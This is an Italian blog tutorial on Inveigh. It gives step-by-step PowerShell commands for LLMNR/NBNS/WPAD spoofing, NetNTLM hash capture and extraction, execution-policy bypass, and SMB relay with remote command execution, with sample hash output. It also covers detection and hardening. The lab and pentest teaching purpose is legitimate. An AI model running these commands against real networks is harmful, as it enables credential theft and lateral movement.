---
title: >-
  Inveigh: Attacchi Hacker su Reti Windows per Rubare Hash NTLM via LLMNR, NBNS
  e WPAD
slug: inveigh
description: >-
  Inveigh è uno strumento PowerShell che consente di eseguire attacchi LLMNR,
  NBNS e WPAD direttamente su macchine Windows. Scopri come un attaccante può
  intercettare credenziali e rubare hash NTLM in modo silenzioso e mirato.
  Ideale per red team e test interni.
image: /INVEIGH.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - inveigh
  - ''
---

# Inveigh: Attacchi Hacker su Reti Windows per Rubare Hash NTLM via LLMNR, NBNS e WPAD

Se in un lab AD vedi name resolution “sporco” (LLMNR/NBNS/WPAD) e vuoi catturare autenticazioni NTLM in modo riproducibile, Inveigh ti dà un setup rapido direttamente da Windows.

## Intro

Inveigh è un tool MITM (per pentester) che combina spoofing di name resolution e listener mirati per catturare credenziali/handshake (es. NetNTLM) su reti Windows.

In lab torna utile quando sei già dentro (post-exploitation) e vuoi trasformare “rumore di rete” in credenziali catturabili, senza dover per forza spostarti su Kali.

Cosa farai:

* avvio “safe” e sanity check
* 3 pattern operativi (capture, stealth, inspect-only)
* cattura NetNTLM via HTTP/SMB + WPAD
* troubleshooting tipico (permessi/porte/firewall)
* detection e hardening (cosa deve fare il blue team)

Nota etica: tutto ciò che segue è pensato SOLO per lab/CTF/HTB/PG/VM personali o ambienti con autorizzazione esplicita.

## Cos’è Inveigh e dove si incastra nel workflow

> **In breve:** Inveigh intercetta richieste LLMNR/NBNS (e spesso WPAD) e le “risponde” per indurre autenticazioni NTLM verso di te, così da catturare NetNTLM e analizzare/validare il rischio in un lab.

Inveigh è tipicamente un “tool da foothold Windows”: lo lanci su una macchina compromessa nel lab e lo usi come sensore/rogue service locale.

Se stai già usando tool Linux-based in LAN (es. Responder), Inveigh è l’equivalente “Windows-side” e può essere più comodo quando non hai posizione di rete perfetta o vuoi ridurre il numero di hop. Per confronto operativo, vedi anche la guida su [Responder per LLMNR/NBT-NS/WPAD in LAN](https://hackita.it/articoli/responder/).

Quando NON usarlo:

* se non puoi garantire perimetro autorizzato (anche solo “ascoltare” e rispondere può impattare utenti/servizi)
* se l’ambiente è fragile (account lockout, sistemi legacy, policy aggressive) e non hai una finestra di test controllata

Segnali tipici che “vale la pena” in lab:

* richieste LLMNR (UDP 5355) o NBNS (UDP 137) frequenti
* tentativi automatici su `WPAD` (proxy auto-discovery)
* autenticazioni NTLM presenti dove ti aspetteresti Kerberos “pulito”

## Installazione, prerequisiti e quick sanity check

> **In breve:** Puoi usare la versione PowerShell (legacy) o la versione .NET (C#). In entrambi i casi, aspettati che alcune funzioni richiedano privilegi elevati e che firewall/porte incidano molto sul risultato.

### Pattern 1: versione PowerShell (comoda in post-exploitation)

Perché: avvio rapido da PowerShell quando sei già su Windows.

Cosa aspettarti: disponibilità dei comandi `Invoke-Inveigh`, `Get-InveighNTLM`, `Stop-Inveigh`.

Comando:

```powershell
# Esempio lab: carica il modulo (path locale in cui hai copiato Inveigh)
Import-Module .\Inveigh.psd1
Get-Command -Module Inveigh
```

Esempio di output (può variare):

```text
CommandType Name              Version Source
----------- ----              ------- ------
Function    Invoke-Inveigh     1.506   Inveigh
Function    Stop-Inveigh       1.506   Inveigh
Function    Get-InveighNTLM    1.506   Inveigh
```

Interpretazione: se vedi i function export, il modulo è caricato correttamente.

Errore comune + fix: `running scripts is disabled`. Imposta ExecutionPolicy SOLO nel contesto del lab/sessione.

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### Pattern 2: versione .NET (C#) se vuoi portabilità e feature set più ampio

Perché: la versione C# è la “primary” e include più protocolli/listener.

Cosa aspettarti: esecuzione via `dotnet` e console interattiva con contatori (capture counts).

Comando:

```powershell
# Esempio lab: esegui Inveigh .NET
dotnet .\Inveigh.dll
```

Esempio di output (può variare):

```text
Inveigh ...
C(0:0) NTLMv1(0:0) NTLMv2(0:0)>
```

Interpretazione: il prompt con contatori indica che il runtime è partito e sta tracciando catture.

Errore comune + fix: `dotnet: command not found` o runtime mancante. In lab, usa build self-contained o porta un binario già compilato per il target.

Nota: alcune funzionalità (es. packet sniffing “raw”) possono richiedere elevazione; se non hai privilegi, preferisci listener/porte disponibili o la modalità “inspect” per osservare senza spoofare.

## Sintassi base: 3 pattern che userai sempre

> **In breve:** Inveigh diventa efficace quando riduci rumore e controlli output: (1) default capture, (2) stealth mirato, (3) inspect-only per capire se vale la pena.

### Pattern A — avvio “default capture” (rapido, ma più rumoroso)

Perché: partire subito a catturare su HTTP/SMB e spoofare LLMNR (eventualmente NBNS).

Cosa aspettarti: console output con richieste intercettate e NetNTLM catturati; file di output se abiliti logging.

Comando:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp
```

Esempio di output (può variare):

```text
[*] Inveigh started
[*] LLMNR Spoofer [ON]
[*] NBNS Spoofer [OFF]
[*] HTTP Capture [ON]
[*] SMB Capture [ON]
```

Interpretazione: stai spoofando LLMNR e ascoltando/catturando su HTTP/SMB; NBNS qui è off per ridurre “blast radius”.

Errore comune + fix: nessuna cattura dopo minuti. Verifica che nel lab esistano richieste LLMNR/NBNS e che firewall locale non blocchi traffico in ingresso (porta/servizio).

### Pattern B — “stealth mirato” (riduci surface e lockout risk)

Perché: limitare host/target e minimizzare replay/risposte ripetute.

Cosa aspettarti: meno eventi, ma più “puliti” e correlabili.

Comando:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -SpooferRepeat N -WPADAuth Anonymous -NBNS N
```

Esempio di output (può variare):

```text
[*] SpooferRepeat [OFF]
[*] WPADAuth [Anonymous]
[*] NBNS Spoofer [OFF]
```

Interpretazione: disabiliti repeat (meno spam verso la stessa vittima) e imposti WPAD in modo da ridurre prompt fastidiosi (dipende dal client).

Errore comune + fix: pensare che “Anonymous” = cattura migliore. In alcuni client può ridurre prompt ma anche cambiare il comportamento; se non vedi nulla, torna a `WPADAuth NTLM` in lab e misura.

### Pattern C — “inspect-only” (prima osservi, poi decidi)

Perché: capire se il lab genera richieste LLMNR/NBNS prima di attivare spoofing/capture aggressivo.

Cosa aspettarti: log di richieste di name resolution senza attivare listener/catture principali.

Comando:

```powershell
Invoke-Inveigh -Inspect -ConsoleOutput Y
```

Esempio di output (può variare):

```text
[LLMNR] Request for FILESRV01 from 10.10.10.23
[NBNS]  Query for WPAD from 10.10.10.45
```

Interpretazione: se vedi richieste ricorrenti per nomi non risolti, hai “carburante” per una sessione di capture controllata.

Errore comune + fix: scambiare “inspect” per cattura. È solo osservazione; quando confermi il pattern, riavvia senza `-Inspect`.

## Cattura NetNTLM: LLMNR/NBNS + HTTP/SMB (cosa raccogli e come lo estrai)

> **In breve:** L’obiettivo pratico è catturare handshake NTLM (NetNTLMv1/v2) associati a username/host. Inveigh ti permette di leggere i capture in memoria e/o su file.

### Cattura e lettura hash in memoria

Perché: estrarre rapidamente hash catturati senza rovistare file.

Cosa aspettarti: liste in output (NTLMv1/NTLMv2) in formato “challenge/response” utile per analisi/validazione in lab.

Comando:

```powershell
Get-InveighNTLM
```

Esempio di output (può variare):

```text
CORP\mrossi::CORP:1122334455667788:2F0A5BD1E1F0...:0101000000000000...
CORP\SRV01$::CORP:9A8B7C6D5E4F3210:AA11BB22CC33...:0101000000000000...
```

Interpretazione: `utente::dominio:challenge:response:blob` è tipico di NetNTLMv2; gli account macchina finiscono con `$`.

Errore comune + fix: vedere “troppi” account macchina. Se vuoi concentrarti su utenti, disabilita la visualizzazione degli account macchina (in base alla versione/parametri disponibili) o filtra output in post.

### WPAD: perché spesso “cade” roba interessante

Perché: WPAD è un vettore automatico che può generare autenticazioni NTLM “senza click”.

Cosa aspettarti: richieste verso `wpad.dat` e tentativi di autenticazione su listener HTTP.

Comando:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -WPADAuth NTLM
```

Esempio di output (può variare):

```text
[HTTP] WPAD request from 10.10.10.45 for /wpad.dat
[HTTP] NTLMv2 captured for CORP\svc_proxy
```

Interpretazione: se un servizio/utente cerca WPAD, puoi ottenere NetNTLM collegati ad account spesso “utili” in lab.

Errore comune + fix: “nessuna richiesta WPAD”. In molti lab moderni WPAD è disabilitato o non usato; non forzare. Torna su LLMNR/NBNS classici e valida con `-Inspect`.

Nota: se abiliti HTTPS nella versione PowerShell, può installare un certificato e legarlo alla 443; in lab, pianifica cleanup (cert store + netsh) se lo testi.

## Relay “da lab”: prerequisiti, validazione e rischi

> **In breve:** Il relay NTLM funziona solo se il target lo consente (es. signing non richiesto) e se l’account catturato ha privilegi sul target. In lab lo scopo è dimostrare l’impatto, non “fare rumore”.

Inveigh (PowerShell) supporta opzioni di relay SMB, ma richiede caricare anche lo script dedicato e impostare un target/command.

Prima di qualsiasi relay in lab, valida la superficie AD e i permessi: mappe e percorsi di escalation sono più chiari se li visualizzi con [BloodHound per Active Directory](https://hackita.it/articoli/bloodhound/) e poi verifichi accessi reali.

### Esempio relay controllato (PowerShell) verso un target di lab

Perché: dimostrare in modo riproducibile che un NetNTLM catturato può “spostarsi” su un altro host se le difese sono deboli.

Cosa aspettarti: tentativo di esecuzione sul target indicato, con output di successo/fallimento.

Comando:

```powershell
# Prerequisito: Inveigh-Relay.ps1 caricato in memoria nel lab
. .\Inveigh-Relay.ps1

Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 10.10.10.20 -SMBRelayCommand "whoami"
```

Esempio di output (può variare):

```text
[*] SMBRelay [ON] Target [10.10.10.20]
[*] Relay attempt for CORP\mrossi
[+] Relay success, command executed
```

Interpretazione: “success” in lab significa che il target ha accettato relay e l’account aveva privilegi sufficienti.

Errore comune + fix: relay fallisce sempre. Le cause più comuni sono SMB signing richiesto, target non raggiungibile o privilegi insufficienti. In quel caso, il valore del test è proprio dimostrare che le mitigazioni funzionano.

Detection + hardening (sempre):

* alert su traffico LLMNR/NBNS anomalo e risposte “rogue”
* enforcement SMB signing dove possibile
* disabilita LLMNR e NBNS via GPO dove applicabile
* disabilita WPAD se non serve o blocca `wpad` name resolution

## Errori comuni e troubleshooting (quelli che ti fanno perdere tempo)

> **In breve:** Se Inveigh “non prende niente”, quasi sempre è (1) niente richieste in rete, (2) firewall/porte, (3) privilegi insufficienti, (4) output non visibile.

### Problema: nessun evento / nessuna cattura

Perché: senza richieste LLMNR/NBNS/WPAD non succede nulla.

Cosa aspettarti: `-Inspect` mostra zero richieste.

Comando:

```powershell
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
```

Esempio di output (può variare):

```text
[*] Inspect mode enabled
[*] No LLMNR/NBNS traffic observed
```

Interpretazione: nel tuo lab non sta passando il traffico che ti serve (o sei nella VLAN sbagliata).

Errore comune + fix: “Inveigh rotto”. Prima prova in una subnet dove sai che esistono host Windows che generano richieste, oppure valida lato rete con cattura su una macchina di supporto (vedi [TShark per sniffing da terminale](https://hackita.it/articoli/tshark/) se sei su Linux in lab).

### Problema: console “freeza” / output non torna in shell remota

Perché: alcune sessioni remote gestiscono male stream diversi (warning, verbose, ecc.).

Cosa aspettarti: comando parte ma non vedi output live.

Comando:

```powershell
Invoke-Inveigh -ConsoleOutput Y -OutputStreamOnly Y
```

Esempio di output (può variare):

```text
[*] OutputStreamOnly [ON]
[*] ConsoleOutput [ON]
```

Interpretazione: forzi output sullo stream standard, spesso più compatibile con shell “fragili”.

Errore comune + fix: pensare che non stia andando. Controlla i file se hai `-FileOutput Y` e un `-OutputDir` scrivibile.

### Problema: porte/servizi in conflitto o firewall locale

Perché: HTTP/HTTPS listener e SMB capture dipendono da binding/porte e regole firewall.

Cosa aspettarti: warning o assenza completa di eventi su HTTP/SMB.

Comando:

```powershell
# Quick visibility: dove stai ascoltando?
netstat -ano | findstr ":80"
netstat -ano | findstr ":445"
```

Esempio di output (può variare):

```text
TCP    0.0.0.0:80     0.0.0.0:0     LISTENING     4
TCP    0.0.0.0:445    0.0.0.0:0     LISTENING     4
```

Interpretazione: PID 4 = System (servizi Windows). Inveigh può catturare anche senza “rubare” la 445 (dipende da modalità/versione), ma se ti serve un listener specifico, pianifica.

Errore comune + fix: aprire tutto “a caso”. In lab, autorizza solo ciò che serve e misura. Se il lab blocca inbound, Inveigh vedrà poco anche se funziona.

## Alternative e tool correlati (quando preferirli)

> **In breve:** Inveigh è ideale da Windows. Se sei su Kali in LAN, spesso Responder + tool di relay dedicati è più flessibile. Se vuoi capire davvero cosa passa in rete, sniff prima, attacca poi.

Alternative pratiche:

* Responder: più immediato da Kali e workflow “LAN offensive” classico. Vedi [Responder per LLMNR/NBT-NS/WPAD](https://hackita.it/articoli/responder/).
* Bettercap: utile in lab quando vuoi MITM/sniffing/spoofing più “general-purpose”. Vedi [Bettercap per MITM e spoofing](https://hackita.it/articoli/bettercap/).
* Wireshark/TShark: per confermare richieste LLMNR/NBNS e capire timing e host “chiacchieroni”. Vedi [Wireshark per analisi traffico](https://hackita.it/articoli/wireshark/).

Quando preferire altro:

* se l’obiettivo è enumerazione AD e non “credential capture”, parti da enum e pathing (es. LDAP/RPC/SMB). In lab puoi integrare con [rpcclient per enum SMB/AD](https://hackita.it/articoli/rpcclient/).
* se vuoi solo validare reachability e flussi senza tool “attivi”, fai sniff passivo.

## Hardening & detection (cosa deve vedere e bloccare il blue team)

> **In breve:** LLMNR/NBNS/WPAD sono superfici “legacy” e spesso disattivabili. Se non puoi disattivarle, devi monitorare e rendere inutile il relay (signing, policy, segmentazione).

Hardening consigliato (alta resa in lab):

* disabilita LLMNR via GPO dove possibile
* limita/filtra NBNS (UDP 137) e blocca name resolution non necessaria
* disabilita WPAD se non serve; in alternativa, controlla rigorosamente come viene risolto `wpad`
* enforcement SMB signing per impedire relay dove applicabile
* riduci NTLM dove possibile (policy, auditing, migrazione verso Kerberos)

Detection “operativa”:

* spike di traffico LLMNR (UDP 5355) e NBNS (UDP 137) con risposte da host non attesi
* pattern ricorrenti di richieste `wpad.dat` verso un host “nuovo”
* correlazione tra nome richiesto (es. `FILESRV01`) e risposte da una workstation “random”
* hunting specifico su PowerShell: comandi e stringhe tipiche di moduli MITM/relay (attenzione ai falsi positivi in lab)

Se vuoi arricchire la parte “enum prima del capture”, usa strumenti di enumerazione SMB e share prima di qualsiasi relay, ad esempio [smbclient per accesso/attacco share](https://hackita.it/articoli/smbclient/) e [Enum4linux-ng per enumerazione Windows](https://hackita.it/articoli/enum4linux-ng/).

## Scenario pratico: inveigh su una macchina HTB/PG

> **In breve:** In un lab AD con un foothold Windows, lanci Inveigh per osservare (inspect), poi abiliti capture mirato e infine estrai NetNTLM per dimostrare l’impatto e scrivere mitigazioni.

Ambiente:

* Attacker foothold Windows: `10.10.10.10` (host compromesso nel lab)
* Subnet lab: `10.10.10.0/24`
* Obiettivo: catturare almeno 1 NetNTLMv2 da traffico LLMNR/WPAD e documentare detection/hardening

Azione 1 (inspect):

```powershell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
```

Azione 2 (capture controllato):

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp -SpooferRepeat N -NBNS N
```

Azione 3 (estrazione hash):

```powershell
Get-InveighNTLM
```

Risultato atteso concreto:

* output con almeno una riga NetNTLMv2 (utente o account macchina)
* file di log/capture in `C:\Windows\Temp` (se `-FileOutput Y`)

Detection + hardening (in 2–4 frasi):

* in lab, registra LLMNR/NBNS e identifica chi risponde alle richieste (rogue responder)
* disabilita LLMNR/NBNS e riduci WPAD dove non serve
* enforcement SMB signing riduce drasticamente l’impatto del relay
* alert su richieste `wpad.dat` e risposte da host non autorizzati

## Playbook 10 minuti: inveigh in un lab

### Step 1 – Conferma che il lab genera LLMNR/NBNS/WPAD

Avvia `-Inspect` per 2 minuti: se non vedi richieste, cambiare tool non aiuta.

```powershell
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
```

### Step 2 – Carica modulo e prepara output directory

Usa una cartella scrivibile e non “strana” per evitare errori di permessi.

```powershell
Import-Module .\Inveigh.psd1
New-Item -ItemType Directory -Path C:\Windows\Temp\inv -Force | Out-Null
```

### Step 3 – Avvia capture con rumore ridotto

Disabilita repeat e NBNS finché non serve davvero.

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -SpooferRepeat N -NBNS N
```

### Step 4 – Osserva per 3–5 minuti e annota sorgenti “chiacchierone”

Segna IP/host che fanno richieste ripetute: sono spesso i migliori candidati per test controllati.

```powershell
# (niente comando obbligatorio) osserva output live e prendi note
```

### Step 5 – Estrai NetNTLM in memoria e salva evidenze

Lo scopo è reportabile: cattura + contesto + mitigazioni.

```powershell
Get-InveighNTLM | Out-File C:\Windows\Temp\inv\netntlm.txt -Encoding ascii
```

### Step 6 – Se serve, abilita WPAD in modo misurato

Non partire da WPAD se non hai visto richieste; abilitalo solo per validare un vettore nel lab.

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -WPADAuth NTLM
```

### Step 7 – Stop pulito e cleanup

Fermati e lascia il sistema in condizioni “pulite” per non inquinare test successivi.

```powershell
Stop-Inveigh
```

## Checklist operativa

* Verifica che il test sia autorizzato (lab/CTF/VM) e che il perimetro sia chiaro.
* Prima osserva con `-Inspect`, poi abilita spoof/capture.
* Usa `-SpooferRepeat N` per ridurre spam e rischio lockout.
* Tieni `-NBNS N` finché non hai un motivo specifico per abilitarlo.
* Abilita `-FileOutput Y` e imposta `-OutputDir` in una path scrivibile.
* Se la shell è instabile, usa `-OutputStreamOnly Y`.
* Se non catturi nulla, verifica traffico reale (LLMNR/NBNS/WPAD) e firewall locale.
* Non usare HTTPS a caso: valuta certificati e cleanup in lab.
* Documenta sempre: sorgente richiesta, nome richiesto, risposta rogue, account catturato, impatto.
* Inserisci detection e hardening nel report (disabilitare LLMNR/NBNS/WPAD, SMB signing, auditing).
* Se testi relay, fallo solo su target di lab e misura perché fallisce (mitigazioni efficaci).
* Chiudi e pulisci: `Stop-Inveigh` e rimuovi artefatti/log se richiesto dalla procedura di lab.

## Riassunto 80/20

| Obiettivo               | Azione pratica                    | Comando/Strumento                               |
| ----------------------- | --------------------------------- | ----------------------------------------------- |
| Capire se vale la pena  | Osserva richieste name resolution | `Invoke-Inveigh -Inspect`                       |
| Avviare capture rapido  | Console + file output             | `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y` |
| Ridurre rumore          | Disabilita repeat e NBNS          | `-SpooferRepeat N` + `-NBNS N`                  |
| Estrarre hash catturati | Leggi NetNTLM in memoria          | `Get-InveighNTLM`                               |
| Gestire shell “fragile” | Forza standard output             | `-OutputStreamOnly Y`                           |
| Chiudere pulito         | Stop e cleanup                    | `Stop-Inveigh`                                  |

## Concetti controintuitivi

* **“Se non catturo nulla, è colpa del tool”**
  Spesso è il lab: senza richieste LLMNR/NBNS/WPAD non hai trigger. Prima `-Inspect`, poi decidi.
* **“Più spoofing = più risultati”**
  Più spoofing = più rumore e più rischio. In lab, parti minimal (`NBNS` off, `SpooferRepeat` off) e scala.
* **“WPAD è sempre la scorciatoia”**
  In alcuni ambienti è spento o ben gestito. Se non lo vedi in `-Inspect`, non fissarti: lavora su LLMNR/NBNS.
* **“Relay è la parte importante”**
  In molti lab moderni il relay fallisce (signing/policy): è un successo difensivo. Il valore è dimostrare impatto o mitigazione.
* **“HTTPS fa sembrare tutto più ‘legit’”**
  Può introdurre certificati/artefatti e complicare cleanup. In lab usalo solo se stai testando proprio quel vettore.

## FAQ

D: Inveigh funziona anche senza privilegi elevati?

R: Dipende dalla versione e dalle feature usate. In lab, se non hai elevazione, preferisci modalità meno “raw” (listener dove possibile) e valida con `-Inspect`.

D: Perché vedo soprattutto account macchina (con `$`)?

R: È normale: molti servizi parlano in automatico. Se ti serve focalizzarti su utenti, filtra output e riduci i vettori che generano rumore (es. NBNS, repeat).

D: Posso usarlo “solo per sniffare” senza spoofare?

R: Sì: usa `Invoke-Inveigh -Inspect` per osservare richieste LLMNR/NBNS senza attivare spoofing/capture aggressivo.

D: Come capisco se il relay è possibile nel lab?

R: Se il target richiede SMB signing e/o l’account catturato non ha privilegi, il relay fallirà. Documenta il fallimento come mitigazione efficace.

D: Cosa devo mettere nel report per essere “utile” al blue team?

R: Evidenze (timestamp, sorgente, nome richiesto, tipo traffico), rischio (cattura NTLM/relay), e mitigazioni concrete (disabilitare LLMNR/NBNS/WPAD, SMB signing, auditing/alert).

## Link utili su HackIta

* [Responder per LLMNR/NBT-NS/WPAD in LAN](https://hackita.it/articoli/responder/)
* [Wireshark per analisi del traffico in lab](https://hackita.it/articoli/wireshark/)
* [TShark per sniffing e filtri da terminale](https://hackita.it/articoli/tshark/)
* [CrackMapExec per operazioni rapide su Active Directory](https://hackita.it/articoli/crackmapexec/)
* [smbclient per accesso e attacco alle condivisioni](https://hackita.it/articoli/smbclient/)
* [NBTScan per enumerazione NetBIOS utile al targeting](https://hackita.it/articoli/nbtscan/)
* [Supporto](https://hackita.it/supporto/)
* [Contatto](https://hackita.it/contatto/)
* [Articoli](https://hackita.it/articoli/)
* [Servizi](https://hackita.it/servizi/)
* [About](https://hackita.it/about/)
* [Categorie](https://hackita.it/categorie/)

## Riferimenti autorevoli

* [Inveigh (repo ufficiale)](https://github.com/Kevin-Robertson/Inveigh)
* [MITRE ATT\&CK T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)

## CTA finale HackITA

Se questo contenuto ti è utile e vuoi far crescere HackIta, puoi supportare il progetto qui: [https://hackita.it/supporto/](https://hackita.it/supporto/)

Se vuoi accelerare davvero (lab guidati, metodo, correzione tecnica), trovi la formazione 1:1 qui: [https://hackita.it/servizi/](https://hackita.it/servizi/)

Per aziende: assessment, test interni e percorsi di hardening/detection su AD e reti Windows sono disponibili qui: [https://hackita.it/servizi/](https://hackita.it/servizi/)
